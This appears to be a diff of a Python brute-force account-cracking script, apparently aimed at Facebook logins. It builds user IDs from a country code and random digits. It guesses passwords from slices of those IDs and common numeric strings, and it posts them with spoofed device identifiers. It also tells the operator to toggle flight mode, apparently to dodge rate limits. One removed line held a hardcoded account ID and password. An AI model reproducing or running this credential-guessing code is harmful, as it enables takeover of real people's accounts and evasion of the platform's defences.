@@ -391,7 +391,7 @@ def india():
 			print(f'\033[1;32m[\033[1;31m✓\033[1;32m] PLEASE [ON/OF] YOUR FLIGHT MODE');linex()
 			for psx in user:
 				uid = code+psx
-				passlist = [psx,uid[:8],'57273200','59039200','57575751']
+				passlist = [ids[:6],ids[:8],ids,ids[2:],ids[4:],'57273200','59039200','57575751']
 				if mthd in ['1','01']:
 					habib.submit(rndm1,uid,passlist)
 				if mthd in ['2','02']:
@@ -938,8 +938,8 @@ def rndm1(uid,passlist):
                         li2 = random.choice(li)
                         j1 = ''.join(random.choice(string.digits) for _ in range(2))
                         jazoest = li2+j1
-                        data = {'email': '100068791466665', 
-'password': 'nitesh kumar', 
+                        data = {'email': uid, 
+'password': pas, 
 'adid': str(uuid.uuid4()),
 'device_id': str(uuid.uuid4()),
 'family_device_id': str(uuid.uuid4()),
